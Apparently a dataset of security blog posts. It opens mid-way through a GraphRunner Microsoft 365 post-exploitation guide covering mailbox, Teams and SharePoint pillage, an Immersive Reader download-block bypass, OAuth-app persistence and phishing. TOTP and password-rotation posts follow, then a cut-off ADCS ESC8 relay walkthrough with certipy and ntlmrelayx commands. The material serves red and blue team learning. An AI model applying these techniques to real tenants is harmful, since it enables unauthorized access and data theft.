different user, and if you want to name it something else.\n\nUpon cloning a group, it will create an identically named group, adding the current members of that group while including your own user. Now when someone goes to add the \u201cAdministrators\u201d group to a role, they will be presented with two options. Which one will they select? Maybe both?\n\nGraphRunner also includes modules for inviting guest users (Invoke-InviteGuest) as well as adding members to groups (Invoke-AddGroupMember).\n\nIn order to use the Invoke-AddGroupMember module, you will need both the group ID and the member ID of the user you want to add to the group. The group ID is output with each group via the Get-SecurityGroups module and the Get-UpdatableGroups module. The user ID for your current user can be found by running Invoke-CheckAccess or using the Get-UserObjectID module.\n\nPillage\n\nGraphRunner includes a number of pillage modules that assist in identifying interesting data post-compromise of a Microsoft 365 account. It contains modules for searching through and collecting data from email, SharePoint, OneDrive, and Teams. The Invoke-SearchMailbox module allows for the searching of terms through the current user\u2019s mailbox. It allows for downloading messages including their attachments and even has a minimal HTML email viewer included for opening the downloaded messages in a web browser.\n\nThe Invoke-SearchMailbox module uses the Graph Search API, so it doesn\u2019t allow for searching of other user\u2019s mailbox. Also, due to the use of the Search API, only items that match the search term will be returned. If you want to get the latest messages from an inbox of either the current user or a shared mailbox, then the Get-Inbox module is the one you will want to use. This module will pull the latest 25 messages from an inbox by default; more can be specified with the -TotalMessages parameter.\n\nMicrosoft Teams has become the primary chat app for many organizations. Occasionally, sensitive data tends to get sent through this medium. It may be of benefit to search through Teams chat messages the user is a part of. The Invoke-SearchTeams module provides search capabilities for messages sent via Teams Chat (Direct Messages).\n\nSimilarly, the Get-TeamsChat module downloads full Teams chat conversations. It will prompt to either download all conversations for a particular user or to download individual conversations using a chat ID. This module requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite.\n\nOccasionally, sensitive data ends up in attributes tied to user accounts. Maybe the help desk set a password for an account and didn\u2019t want to forget it, so they set the password as a comment in an attribute. We have seen similar cases to this on many pentests, and it can lead to gaining access to other accounts not previously accessible. GraphRunner has a module to search through every attribute field for every Entra ID user called Invoke-SearchUserAttributes. Using this module, you can pass it a search term to look for in Entra ID user attributes.\n\nSharePoint is one of the largest services for file sharing and collaboration. Many organizations are using it in a similar manner to the way that internal network file shares are used to store files, some of them including sensitive data such as credentials. Historically, we have used tools such as ShareFinder and FileFinder from PowerView, or Snaffler to help us look for interesting files on internal networks. There is SnaffPoint for searching SharePoint sites but it doesn\u2019t appear to use the Graph API. The advantage of using the Graph Search API for searching for files is that it will automatically search all SharePoint sites AND OneDrive locations accessible to your user without needing to specify a certain site.\n\nThe Graph Search API uses Keyword Query Language (KQL), which lets users filter searches with terms like \u201cfiletype\u201d, \u201cfilename\u201d, and \u201cauthor\u201d. For example, if you wanted to find all Word document files that contain the term \u201cpassword\u201d in them, you can search for \u201cfiletype:docx password\u201d. GraphRunner has a module called Invoke-SearchSharePointAndOneDrive that leverages this search functionality and allows you to also download any files that were discovered.\n\nIf you want to simulate a similar type of assessment that Snaffler and Snaffpoint do, you can leverage the provided \u201cdefault_detectors.json\u201d file in the GraphRunner repo. This file contains much of the same search syntax the other tools use, with some modifications to make them work with KQL. The following script will use Invoke-SearchSharePointAndOneDrive while looping through all of the detectors and output a CSV file called interesting-files.csv into a folder that is titled with the current date and time. The output contains the detector name that triggered, the name of the file, the Drive ID and Item ID (needed for downloading files), the last modified date, a file preview, the size of the file, and the web location (URL) where the file can be found.\n\n$folderName = \"SharePointSearch-\" + (Get-Date -Format 'yyyyMMddHHmmss')\nNew-Item -Path $folderName -ItemType Directory | Out-Null\n$spout = \"$folderName\\interesting-files.csv\"$DetectorFile = \".\\default_detectors.json\"$detectors = Get-Content $DetectorFile\n$detector = $detectors |ConvertFrom-Json\nforeach($detect in $detector.Detectors){Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun}\n\nIf you want to download one of the files from the CSV output, you can use the supplemental module called Invoke-DriveFileDownload and specify the combined Drive ID and Item ID from the spreadsheet.\n\nUsing Immersive File Reader to Bypass SharePoint File Block\n\nMicrosoft\u2019s SharePoint Online service allows authenticated users to manage files in a cloud storage environment. Accessing SharePoint Online may be done via a web browser to https://companyname.sharepoint.com or with the SharePoint/OneDrive app.\n\nFrom a security perspective, controlling who has access to what in SharePoint is critical to prevent data loss. Microsoft recommends enforcing a least-privilege administrative model described here: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models. Meaning users should only have permissions to access what they need. I would add that users should only be able to authenticate to a company\u2019s SharePoint instance from a company compliant device.\n\nTo help prevent data loss, Microsoft provides the option to restrict access to users accessing SharePoint from unmanaged devices that are not controlled by the organization operating the SharePoint instance. https://learn.microsoft.com/en-us/sharepoint/control-access-from-unmanaged-devices.\n\nWith the policy enabled, a user browses to SharePoint Online and attempts to open a file named death_star_plans.txt.\n\nNote the warning that security policy doesn\u2019t allow you to download or view the file since the user is browsing from an unmanaged device.\n\nWhen a user on an unmanaged device clicks \u201cOpen\u201d, the security policy will block the user from opening the file.\n\nHowever, the option to open the file in Immersive Reader may appear under the \u201cOpen\u201d drop-down.\n\nClicking on \u201cOpen in Immersive Reader\u201d results in the file opening for us!\n\nImmersive Reader will even speak the text to you.\n\nWhat is Immersive Reader?\n\nAt its core, Immersive Reader is an application that performs text-to-speech within certain Microsoft applications. For Microsoft SharePoint Online, that means we can visibly and audibly \u201cread\u201d text files from accessible SharePoint drives.\n\nMore info here: https://techcommunity.microsoft.com/t5/education-blog/immersive-reader-comes-to-powerpoint-for-the-web-onedrive/ba-p/2242568\n\nBack to the previous request for \u201cdeath_star_plans.txt\u201d, we take a look at the request which opens the file with Immersive Reader.\n\nGET /transform/imreader?provider=spo&inputFormat=txt&cs=fFNQTw&docid=https%3A%2F%2Ftestbeau.sharepoint.com%3A443%2F_api%2Fv2.0%2Fdrives%2Fb!UZKcPDJOak6rlVu_8sqLHrL37OSkA7tNiIu6hH3cVmYli4rws4usRomUi9sy-cG4%2Fitems%2F01F276Q3X3SAZEE3ZISRBZ7UJRBMQRKWEB%3Fversion%3DPublished&access_token=&nocache=true&cTag=%22c%3A%7B423290FB-286F-4394-9FD1-310B21155881%7D%2C1%22 HTTP/1.1\nHost: southcentralus1-mediap.svc.ms\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: /\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://testbeau.sharepoint.com/\nOrigin: https://testbeau.sharepoint.com\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: cross-site\nTe: trailers\nConnection: close\n\nWe can see that the access_token is in the GET request. Checking the JWT in jwt.io, we see that it is scoped to SharePoint Online\u2019s principle ID.\n\nIt\u2019s also interesting to note that the request isn\u2019t being directed to *.sharepoint.com. Rather, it\u2019s directed at southcentralus1-mediap.svc.ms.\n\nGraphRunner Weaponization\n\nImplementing Invoke-ImmersiveFileRead into GraphRunner was rather easy with the captured GET request. The cmdlet takes the target SharePoint domain, DriveID, and FileID as parameters.\n\nWe might find the DriveID and FileID by searching SharePoint for the filename* and the filetype with extension.\n\nInvoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm \"death_star_plans* AND Filetype:txt\"\n\nThe file was found in two places as our user shared it in Teams as well.\n\nGraphRunner will prompt you with the option to download any files that were found.\n\nAttempting to download both files, we see that the Teams file successfully downloaded, because it is on the user\u2019s personal OneDrive/SharePoint. Unfortunately, the default block policy only applies to SharePoint, which doesn\u2019t seem to include the \u201ctenant-my.sharepoint\u201d sites by default.\n\nFurther restrictions are needed to restrict downloads from unmanaged devices on other applications. https://learn.microsoft.com/en-us/microsoftteams/block-access-sharepoint\n\nNext, we\u2019ll use Invoke-ImmersiveFileReader to attempt to open the file we couldn\u2019t access.\n\nInvoke-ImmersiveFileReader -SharePointDomain testbeau.sharepoint.com -DriveID \"b!U..\" -FileID \")1..\" -Tokens $Tokens\n\nSuccess! We\u2019ve successfully opened the file just like the Immersive Reader feature in the browser.\n\nSome txt files may not show the Immersive Reader as an option. These may still be viewed by Immersive Reader in some cases.\n\nNow, what about reading other types of files? Here is pyauth.py on the testbeau.sharepoint.com SharePoint site.\n\nWe see that the file is restricted from being open or downloaded, and, most importantly, there is no immersive file reader option. We\u2019ll try with the Invoke-ImmersiveFileReader cmdlet.\n\nInvoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm \"pyauth* AND filetype:py\u201d\n\nWe found the file and attempted to download it without success.\n\nEven though there\u2019s no Immersive Reader option from the browser for this Python file, we\u2019ll try Invoke-ImmersiveFileReader anyway.\n\nInvoke-ImmersiveFileReader -SharePointDomain testbeau.sharepoint.com -DriveID \"b!UZKcPDJOak6rlVu_8sqLHrL37OSkA7tNiIu6hH3cVmYli4rws4usRomUi9sy-cG4\\\" -FileID \"01F276Q3TIC57IYFZK3BBIDB2JE4VHVWSY\" -Tokens $Tokens\n\nSuccess! We have accessed the data in a Python file with Immersive Reader, where there was no option from the web portal. The file should not be readable with the Unrestricted Device policy in-place as well. What other files can we read using Immersive Reader?\n\nDefenses Against Immersive Reader Access\n\nTo enforce basic protections on SharePoint Online, Microsoft requires an \u201cEnterprise Mobility + Security\u201d license.\n\nNext, enforce Unmanaged Device blocking policy.\n\nFrom the SharePoint Admin Center, SharePoint administrators may enforce the Unmanaged Devices policy to block unauthorized access to files from non-compliant devices.\n\n\ud83d\udce2\n\nAccess is allowed on apps that don't use modern authentication. Users who use these apps will have full access to content in SharePoint and OneDrive, even on unmanaged devices.\n\nAdditionally, SharePoint administrators may further modify the conditional access policy created when enabling the unmanaged device block. Further restrict authenticated users from accessing SharePoint Online files from unmanaged devices by ensuring the device is compliant and/or Hybrid joined.\n\nMicrosoft SharePoint Online provides administrators with the ability to restrict file downloads for authenticated users accessing the service from an unmanaged device. Using the Immersive Reader feature, we\u2019re able to bypass unmanaged device restrictions that aren\u2019t backed by additional conditional policy.\n\nInvoke-GraphRunner\n\nGraphRunner includes a function that automates the running of multiple recon and pillage modules called Invoke-GraphRunner. This module will run the Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps recon modules. It then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams. This may be of benefit when trying to quickly automate data collection from an account.\n\nGraphRunner GUI\n\nWhile not as fully featured as the GraphRunner PowerShell script, the HTML GUI can be useful in times when you want to visually click through items such as email, Teams messages, SharePoint/OneDrive drives, and more. All it requires is that you have an authenticated access token to the Microsoft Graph API. Each of the functionalities require different permissions, so unless your token has been scoped correctly, some functions may not work.\n\nOnce the GraphRunnerGUI.html file has been opened in a web browser, input your authenticated access token into the \"Access Token\" field. After doing so, all functionality in the page will utilize this token during requests to the Microsoft Graph API. It's important to understand that every action against the Microsoft Graph API relies on specific permissions being scoped to the token you have. When in doubt refer to this permissions reference guide: https://learn.microsoft.com/en-us/graph/permissions-reference\n\nThe GUI has a \"Parse Token\" function that will parse your token and display the permissions that are scoped to your token.\n\nThere is a Custom API Request section that gives you a place to make custom requests to the API if you wish. You can use the drop down to select other HTTP methods and can use the text box to insert POST data.\n\nThe directory sections provide the ability to gather users and groups from the directory. The \"Export\" button will create a text file of the results. Clicking on a group name will display the members of that group below.\n\nThe \"Email Viewer (Current User)\" section is where you can load recent messages from the current account as well as search for specific terms. Clicking on a message will load it in an HTML email viewer below the list of emails.\n\nThe \"Email Viewer (Other Users)\" section is where you can read mailboxes that have been shared by other users. Use this in collaboration with the Invoke-GraphOpenInboxFinder module from the GraphRunner.ps1 script to discover mailboxes that have been misconfigured in the tenant to allow other users to access them.\n\nThe \"Send Email\" section allows you to send emails from the current account, including the ability to add attachments.\n\nThe \"Teams Chat Viewer (Direct Messages and Group Chat)\" loads Teams chat conversations where the user is either DM'ing with someone or part of a group chat. Clicking on the conversation date box will load the recent messages from that chat. While a conversation is selected messages can be sent to that particular conversation through the \"Send Message to Teams Chat\" text box.\n\nThe \"OneDrive My Files\" button will load files from the current user's OneDrive file share. Folders can be navigated through and files can be downloaded here.\n\nThe \"OneDrive Shared Files\" button will load files that have been shared with the user. This is commonly where files sent through Teams messages are located.\n\nLast but not least, the SharePoint section will load the user's SharePoint documents and allow you to download them.\n\nOAuth Flow Automation\n\nWhenever a user consents to an OAuth app, their browser sends a request to a specified redirect URI to provide an authorization code. The PHPRedirector folder contains code that can be hosted on a web server to capture an OAuth authorization code as well as complete the OAuth flow. In situations where the user that is consenting to an app is remote, you may want to automatically complete the OAuth flow and obtain access and refresh tokens. The AutoOAuthFlow.py script facilitates this ability while writing any access tokens to a file on disk called access_tokens.txt.\n\nWhen you are ready to capture codes, you can run AutoOAuthFlow.py to watch for new OAuth codes and complete the flow using your App credentials. Whenever a web request is sent to the web server that contains an OAuth code, it will be written to codes-bak.txt and will be used to attempt OAuth flow completion to obtain access tokens. If successful, the access tokens will be written to access_tokens.txt in the same directory as the Python script.\n\nPotential Attack Paths\n\nGraphRunner has a lot of different modules that do specific tasks, but combining them can lead to interesting attack paths in certain scenarios. Below are a few examples where GraphRunner may benefit you in identifying potential situations where it can be used for persistence, privilege escalation, data harvesting, and more within an M365 account.\n\nGroup-Based PrivEsc (Adding user)\n\nIdentify groups that can be modified by current user (Get-UpdatableGroups)\n\nDetermine current access level (Get-SharePointSites, Invoke-DumpCAPS, Check for subscription access, Invoke-GraphRecon -PermissionEnum, etc.)\n\nInject your user into the group (Invoke-AddGroupMember)\n\nRe-run enumeration modules to see if there is new access to sites/policies.\n\nBonus\n\nGuest users can be injected into groups too, but your current user (Entra ID user in the target tenant) needs to be injected first.\n\nDynamic Group PrivEsc (Abusing membership rule)\n\nIdentify dynamic groups (Get-DynamicGroups) that have rules that can be abused, such as a rule that adds a user to a group if their email contains \u201cadmin\u201d.\n\nAnalyze membership rules to determine if they can be abused.\n\nExample: Invite guest user to tenant with an email that has \u201cadmin\u201d in the email address to get added as a member of a group where UPN\u2019s that contain \u201cadmin\u201d get automatically added to it.\n\nWatering Hole Attack via Cloned Group\n\nIdentify an interesting group (SharePoint Admins, Dev groups, other IT groups, etc.)\n\nClone it and add your own user (Invoke-SecurityGroupCloner)\n\nWait for an admin to mistakenly add your cloned group to a policy somewhere OR come up with a ruse to get it added\n\nMonitor access to various M365 pieces like SharePoint, Teams, CAPS policies, subscriptions, etc.\n\nPersistence via OAuth App\n\nInject an OAuth App registration (Invoke-InjectOAuthApp) into the same tenant as the compromised user.\n\nSet up a listener to complete the OAuth flow with either Invoke-AutoOAuthFlow to catch the redirect on your localhost, or the AutoOAuthFlow.py script to catch it on another server.\n\nAfter consenting to the app, it will generate tokens associated with the app registration that can be leveraged for accessing M365 as the user.\n\nIf the user changes their password, you still have access as the app.\n\nIf all sessions get killed, the refresh token of the app is still valid until it expires (default is 1 hour from creation time)\n\nPersistence to SharePoint/OneDrive Files via Guest User access\n\nIf external sharing for a site is set to allow \u201cAnyone\u201d or \u201cNew and existing guests\u201d access via external sharing, then it may be possible to leverage a guest account for long term access to specific files.\n\nInvite guest user to tenant (Invoke-InviteGuest).\n\nGather SharePoint share links and maintain long term access to files until guest user is removed.\n\nInternal Phishing via OAuth App\n\nInject an OAuth app (Invoke-InjectOAuthApp) that has limited permissions (Mail.Read) into the same tenant as the compromised user.\n\nUse it to perform illicit consent grant phishing attacks internally for more access.\n\nFind Other Mailboxes You Can Read\n\nDeploy an app with the \u201cMail.Read.Shared\u201d scope into the victim tenant and consent to it with your user, or consent to this permission on the Graph Explorer and leverage the app token with GraphRunner.\n\nUse Invoke-GraphOpenInboxFinder to find other mailboxes that have been shared with you.\n\nUse Get-Inbox to pull the latest messages from other inboxes you can read.\n\nPillage SharePoint, Teams, and Email\n\nLeverage the pillage modules to identify sensitive data sent in email (Invoke-SearchMailbox, Get-Inbox), Teams chat (Invoke-SearchTeams, Get-TeamsChat), or SharePoint (Invoke-SearchSharePointAndOneDrive).\n\nUse the following command to perform \u201cSnaffler-like\u201d scanning of a SharePoint site:\n\nInvoke-GraphRunner -Tokens $tokens -DisableRecon -DisableUsers -DisableGroups -DisableCAPS -DisableApps -DisableEmail -DisableTeams\n\nSearch User Attributes\n\nLeverage the Invoke-SearchUserAttributes module to identify potentially sensitive information in Entra ID user attributes.\n\nImmersive File Reader\n\nUse Invoke-SearchSharePointAndOneDrive to identify interesting files\n\nUse Invoke-ImmersiveFileReader to download them in some environments that block file downloads from SharePoint and OneDrive.\n\nFind CAP Bypasses and Enumerate Permission Scopes Using Different Client IDs\n\nGather a refresh token from an authenticated session (Ex. intercept browser).\n\nUse it with the Invoke-BruteClientIDAccess module to find applications that can authenticate or be refreshed to, along with their associated permission scopes.\n\nIn this instance, conditional access blocked access to MSGraph from FireFox.\n\n5. As seen below, there are some clientID\u2019s that have rights where some do not.\n\n6. It may be possible to abuse this for initial access via Device Code phishing by changing the ClientID for the initial code request to something like Microsoft Edge.\n\n7. Successful Device Code flow bypassing a Conditional Access Policy.\n\nConclusion\n\nGraphRunner was created to help identify and exploit common security issues in Microsoft 365. It\u2019s a tool that was made for the red team, but we think blue teamers will be able to leverage it as well to proactively identify security issues. The attack surface for cloud environments continues to grow, and with that, so will GraphRunner. For the user guide and information about individual modules, check out the wiki here: https://github.com/dafthack/GraphRunner/wiki\n\nDownload GraphRunner: https://github.com/dafthack/GraphRunner/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Opt for TOTP to Deal With MFA App Sprawl\"\nTaxonomies: \"General InfoSec Tips & Tricks, Informational, Sean Verity\"\nCreation Date: \"Thu, 26 Oct 2023 16:00:00 +0000\"\n\n| Sean Verity\n\nDo you have a bunch of MFA apps on your phone that leave you feeling like you can't put your arms down?\n\nOr maybe all those MFA apps on your phone feel like a litter of English bulldog puppies. They follow you around, demand your attention, and give you security snuggles.\n\nEither way, that's a lot of figurative winter gear to take care of, a lot of mouths to feed. With all those apps to keep track of, consider the following:\n\nWhat will you lose access to if you break or lose your phone?\n\nDo all your MFA apps let you do backup / export?\n\nFor the apps that you know do backups, did you do a backup within the past month or so?\n\nWhat's the process look like for restoring those MFA apps on a new phone?\n\nHave you tested this process to make sure there aren't any surprises?\n\nHow about migrating to a different MFA app?\n\nAssuming you can export your data, how hard is it going to be to convert that data into a format that your next MFA app can parse?\n\nI'll be the first to admit that I've been socially engineered by service providers to install their MFA apps on more than one occasion. Think about one of those times where you registered MFA with a new service provider. The procedure usually starts with the service provider saying something like, \"Your organization is requiring you to do MFA. Start by installing our MFA app.\"\n\nWhat if I already have three MFA apps on my phone? Are none of them good enough? If you're lucky, the service provider will at least suggest a couple alternative MFA apps that could work. Even after registration though, there's a pretty good chance that you'll be gently nudged to install the service provider's app every time you log in, with phrases like, \"Can't access our MFA app right now?\" Talk about presumptuous.\n\nWhile each MFA app has its own \"special way of doing MFA that's way more secure than every other vendor,\" there is a standards-based approach to MFA you're probably familiar with that just about every MFA app supports. It's the MFA flavor where you have 30 seconds to enter a 6-digit code and it goes by a couple of names:\n\nGoogle Authenticator\n\nTime-based One Time Password (TOTP)\n\nI used to think that you MUST install the Google Authenticator app when I saw \"Google Authenticator\" listed as a supported MFA app. However, I've now come to interpret \"Google Authenticator\" as \"an app that supports TOTP.\" From the Google Authenticator Github Wiki:\n\nThe nice thing about service providers that support TOTP, is that there are a LOT of apps that support TOTP because it is standardized1 and pretty simple. Here's an overview of how TOTP authentication usually2 works:\n\nThe user and the service provider have a shared secret.\n\nThe user's TOTP app counts the number of time steps since the Unix epoch. The number of time steps is combined with the shared secret to calculate a 6-digit code with HMAC-SHA-1.\n\nThe user presents the 6-digit code to the service provider during authentication. Upon receipt of the 6-digit code, the service provider does the same calculation using its copy of the shared secret.\n\nIf the codes match, the authentication is successful.\n\nEasy peasy, hey? As a matter of fact, TOTP is so simple that you could implement it in 20 lines of python or almost entirely in bash if you're not into the whole graphical user interface thing.\n\nSo, this means that you have more flexibility with what MFA apps to use and how many to install when you opt for TOTP. For example:\n\nYou could choose to use a commercially supported, closed-source app or an open-source app that you can audit.\n\nYou could do offline local backups of MFA keys or use a solution that offers an online backup feature that you trust.\n\nYou can find a TOTP app that lets you register multiple devices.\n\nIf you're into retro computing, you could turn that old Commodore 64 into a stand-alone TOTP generator.\n\nHow to Tell if a Service Provider Supports TOTP\n\nWhen it comes to identifying if a service provider supports TOTP, you probably will not get a clear declaration. Here are a few hints that you\u2019re more likely to see during MFA registration:\n\nThe service provider will state something along the lines of \u201cEnter a code from your MFA app.\u201d This is an acknowledgement that you may already have an MFA app. Since TOTP is the most common flavor of MFA, there\u2019s a good chance that TOTP is supported.\n\nLook for an option that says \u201cGoogle Authenticator.\u201d Oftentimes, a Google Authenticator logo will be next to it.\n\nIf neither of those other hints are showing up, then TOTP might be buried as a fallback option. That is, you might need to reject the initial offerings from the service provider. This is sometimes indicated by \u201cTry another method.\u201d\n\nHow to Shop for TOTP Apps\n\nObviously, the primary consideration is whether the app supports TOTP. As with MFA registration, app descriptions in the App Store or Google Play generally don\u2019t come out and say, \u201cThis app supports TOTP.\u201d Most MFA apps do support TOTP, but to verify, search for something like \u201cdoes XYZ MFA app support TOTP.\u201d This should yield a technical support page, blog, or (best of all) source code.\n\nHere\u2019s a few more questions to consider which might take a little legwork to figure out as you start to narrow down your choices:\n\nMFA Code BackupsIs cloud backup OK or do you need local backups?\n\nIf cloud backups are OK, do your backups need End-to-End Encryption (E2EE)? Not all MFA apps offer E2EE backups. See the following: https://www.bleepingcomputer.com/news/google/google-will-add-end-to-end-encryption-to-google-authenticator/\n\nNumber of Device Registrations\n\nCan you get away with having only one device registered with a service provider? If you want to have a backup device at the ready, keep an eye out for features that let you transfer or export MFA codes to a second device.\n\nDo you have a \"de-Googled\" Android phone and want to keep it that way?\n\nGoogle services are typically necessary to install or launch an MFA app when the app supports push notifications, even if a service provider doesn't use push notifications for MFA\u2026\n\nIndependent Security Audits\n\nLook for independent security audits of an MFA app you\u2019re considering. Here\u2019s a detailed USENIX 2023 paper to get you started: https://www.usenix.org/system/files/sec23summer_198-gilsenan-prepub.pdf.\n\nWhat\u2019s really cool about this paper is that the researchers provide steps to reproduce their findings: https://github.com/blues-lab/totp-app-analysis-public\n\nWill there be cases where your chosen MFA app doesn't work for a specific scenario?\n\nBut, hopefully you've seen how opting for TOTP provides you some flexibility in how you do MFA. At the very least, you won't have as many MFA apps to keep track of if you opt for TOTP authentication.\n\nFootnotes\n\n[1] https://datatracker.ietf.org/doc/html/rfc6238\n\n[2] SHA-1 is the suggested default and by far the most common implementation. The RFC mentions SHA-256 or SHA-512 variants though. TOTP time steps don't have to be 30 seconds either. You could go crazy and generate TOTPs every 5 seconds if you wanted to.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Rotating Your Passwords After a Password Manager Breach\"\nTaxonomies: \"Ethan Robish, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Personal Security\"\nCreation Date: \"Thu, 02 Nov 2023 16:13:04 +0000\"\n\n | Ethan Robish\n\nIt\u2019s been nearly a year since Lastpass was breached and users' encrypted vaults were stolen. \n\nI had already migrated to a different password manager for all my existing and new accounts, but I had been putting off rotating passwords for existing accounts. I was like the child who plugs his ears while chanting, \"La, la, la, I can't hear you. I have a long master password,\" while his parents try to provide wisdom. I know I'm not alone in this either. \n\nRecently, there's even been evidence that attackers have cracked users' vaults and begun stealing cryptocurrency from the victims. This was the final push I needed to unplug my ears and take action. \n\nIf you're anything like me, you have hundreds of accounts accumulated over time. Whenever I looked at the pile of accounts and secrets in my stolen vault, I became discouraged by the seemingly insurmountable task of logging into each site and changing the password. What I realized was that it wasn't all or nothing; not all these dusty old accounts were of the same value to me (or an attacker). I decided to make a prioritized list for me to work through. This turned out to be a much more fruitful exercise than just hoping the problem would go away. \n\nI decided I would share my thought process and my prioritization list for anyone else who might find it useful. Hopefully, this post can be a gentle nudge to shore up your own personal security. \n\nGeneral Considerations \n\nThis applies even if you haven't migrated from LastPass to another password manager. \n\nIf you have a significant other, help them through this process as well. Not only because you care for them, but because a breach of their accounts could affect you as well. \n\nI have extreme dislike for \"security\" questions, also known as account recovery questions. I tend to pick nonsense answers that are untrue, but still plausible in case I ever have to use them with a real person. I store these questions and answers in my password manager. This means that I need to change these answers as well. \n\nSince I was logging into accounts anyway, I took the opportunity to evaluate any new 2FA capabilities and upgrade to a stronger mechanism where possible (none -> SMS -> TOTP -> Security Key). Some accounts are even starting to support Passkeys. \n\nPrioritize accounts with no existing 2FA enabled. But remember that your account is only as strong as its weakest link \n\nPrioritization Steps \n\nExport a backup from your current password manager. You never know when this can come in handy. Store this in a secure place.\n\nChange email account passwords. Email is often used to recover passwords.\n\nChange cell provider password. Set a port out PIN if your carrier supports it. This will reduce the risk of a SIM swapping attack.\n\nChange all financial account passwords.\n\nPrioritize from most money to least.\n\nInvestments, banking, credit cards\n\nCryptocurrency - If your seed phrase or wallet key was exposed, transfer your coin to a new wallet.\n\nRotate any private keys that were exposed (e.g. SSH, GPG, TLS).\n\nPrioritize ones without encryption or where the encryption password was also stored.\n\nThis is probably the biggest headache of all because it involves revoking key signatures and removing SSH keys from all systems where it was added.\n\nOther important accounts. Think of places where it would be detrimental for someone to impersonate you.\n\nIdentity providers - Places you see listed on the \"sign in using another account\u201d pages (e.g. Apple, Github, Facebook, Google, Microsoft).\n\nCloud infrastructure (e.g. Digital Ocean, AWS, Azure)\n\nDNS Registrars (e.g. Cloudflare, GoDaddy, Namesilo)\n\nCode repos (e.g. Github, Gitlab)\n\nFile backups (e.g. Dropbox, Backblaze)\n\nRemote management (e.g. Teamviewer)\n\nShopping (e.g. Amazon)\n\nSocial media\n\nFinally, delete your LastPass account if you have migrated elsewhere. Of course, this won't help protect anything already stolen, but it will help reduce your risk in the future by reducing your attack surface to only what you are actually using (whatever your current password manager is).\n\nUltimately, you get to decide how far down this list you want to go. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Abusing Active Directory Certificate Services (Part 3)\"\nTaxonomies: \"Alyssa Snow, Blue Team, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Red Team, Active Directory, ADCS, exploit\"\nCreation Date: \"Thu, 09 Nov 2023 17:06:33 +0000\"\n\n| Alyssa Snow\n\nIn PART ONE and PART TWO of this blog series, we discussed common misconfigurations of Active Directory certificate templates. In this post, we will walk through exploitation of the Web Enrollment feature. Active Directory Certificate Services (ADCS) supports HTTP-based enrollment methods. If enabled, HTTP-based certificate enrollment interfaces can be vulnerable to NTLM relay attacks. If an attacker can coerce a victim account to authenticate to the attacker-controlled machine, the credential material can be relayed to the Certificate Authority to request a certificate on behalf of the victim. \n\nIn some cases, a relay attack may not even require domain credentials. For example, if the victim host is not patched against CVE-2021-369421, an attacker on the network could trick the victim machine to authenticate to the attacker host by abusing the vulnerable API method OpenEncryptedFileRaw through LSARPC (Local System Authority Remote Protocol) interface. \n\nThis blog post will not discuss relay attacks in detail; however, BHIS has many resources for red and blue teams alike on relay attacks, which can be found in the \"Resources\" section towards the end of this article. \n\nESC8\n\nIn the following example, let\u2019s imagine that we have gained a foothold in our target company FOOBAR\u2019s internal network and have compromised the account of a user with the name \u201cbilly.\u201d We want to enumerate the ADCS configuration for the internal target domain \u201cfoobar.com.\u201d \n\nTo enumerate ADCS configurations with Certipy2, use the find command and use the -enabled flag to specifically print out templates that are enabled. \n\nThe full Certipy command is shown below: \n\ncertipy find \\ \n -u 'billy@foobar.com' \\ \n -p \\ \n -dc-ip \\ \n -enabled \n\nCertipy outputs the enumeration results of interest in JSON (JavaScript Object Notation) and TXT files following the naming convention \"_Certipy\" as shown in the figure below.  \n\nADCS Enumeration \n\nNote that the ESC8 technique does not abuse certificate template misconfigurations. Instead, this technique leverages the configuration of the Certificate Authority (CA) server.  \n\nActive Directory Certificate Authorities that are vulnerable to ESC8 meet the following conditions: \n\nWeb Enrollment: Enabled \n\nRequest Disposition: Issue \n\nVulnerable Certificate Authority \n\nAs shown in the figure above, foobar-CA is vulnerable to ESC8, which means, if we can coerce a domain account to authenticate to our machine, we can relay the victim\u2019s credential material to the CA to obtain a certificate on behalf of that victim.  \n\nThe template specified in the relay attack must be a template that the victim account has permission to enroll in. For instance, a common NTLM relay technique involves tricking a machine account to authenticate to the attacker-controlled host via abuse of Microsoft's Encrypting File System Remote Protocol (MS-EFSRPC).  \n\nIn this example, we will coerce server01.foobar.com to authenticate to our machine (10.10.1.100) and request a certificate using the following enabled template. \n\nDomain Computers Template \n\nThe attack path can be summarized as follows: \n\nCoerce the victim machine (server01.foobar.com) to authenticate to an attacker-controlled host. \n\nRelay the hash obtained from the victim to the ADCS HTTP endpoint http:///certsrv/certfnsh.asp. \n\nRequest a certificate in the name of the coerced machine account. \n\nAuthenticate with the obtained certificate to collect the NTLM hash of the victim machine. \n\nStep 1: Set Up Relay \n\nWe can configure Certipy to relay the coerced credentials to the ADCS HTTP endpoint http://foobar-CA.foobar.com/certsrv/certfnsh.asp to request a certificate on behalf of server01.foobar.com using the following command.  \n\ncertipy relay \\ \n -ca foobar-CA.foobar.com \\ \n -template 'DomainComputers' \n\nIf you do not specify a template name, Certipy will attempt to issue a certificate using the Machine and User templates. These are default templates, but that does not mean that they will be available in your target environment or that they apply to your victim account. \n\n*Side Note:* You could also use Impacket3 to relay the credential material to the target HTTP endpoint.  \n\nThe Impacket command for this is shown below. \n\npython3 ntlmrelayx.py \\ \n -t 'http://foobar-CA.foobar.com/certsrv/certfnsh.asp' \\ \n --adcs \\ \n --template 'DomainComputers' \n\nIf you do not specify a template name, Ntlmrelayx will attempt to issue a certificate using the DomainController template. This is a 